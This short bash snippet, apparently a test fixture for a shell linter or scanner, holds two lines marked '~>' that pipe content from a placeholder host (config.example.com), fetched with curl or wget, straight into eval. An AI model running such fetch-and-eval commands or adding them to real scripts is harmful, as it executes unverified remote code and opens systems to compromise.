#!/usr/bin/env bash
set -euo pipefail
~>eval "$(curl -fsSL https://config.example.com/env.sh)"
~>eval `wget -qO- https://config.example.com/vars`
